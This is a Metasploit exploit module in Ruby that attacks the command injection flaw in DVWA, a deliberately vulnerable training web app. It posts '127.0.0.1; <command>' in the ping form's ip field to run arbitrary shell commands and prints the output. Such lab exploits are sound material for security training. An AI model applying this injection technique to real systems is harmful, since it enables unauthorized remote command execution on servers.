##
# DVWA Command Injection - Remote Command Execution
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DVWA Command Injection RCE (Simple CMD)',
      'Description'    => %q{
        This module exploits a command injection vulnerability in DVWA's vulnerable "exec" module.
        It allows remote command execution via direct command injection, without using a payload.
      },
      'Author'         => ['Alejandro Torres - torrescrack'],
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'May 04 2025'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to DVWA', '/vulnerabilities/exec/']),
        OptString.new('COOKIE',    [true, 'Authenticated session cookie (PHPSESSID=...)']),
        OptString.new('CMD',       [true, 'Command to execute on the target'])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    })

    if res && res.body.include?('Ping a device')
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    cmd = datastore['CMD']
    print_status("Sending command: #{cmd}")

    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri'    => normalize_uri(target_uri.path),
        'cookie' => datastore['COOKIE'],
        'vars_post' => {
          'ip'     => "127.0.0.1; #{cmd}",
          'Submit' => 'Submit'
        }
      })

      if res && res.code == 200
        print_good("Command sent successfully!")
        print_line("Response:\n#{res.body}")
      else
        print_error("Failed to send the command.")
      end
    rescue => e
      print_error("Error while sending request: #{e}")
    end
  end
end
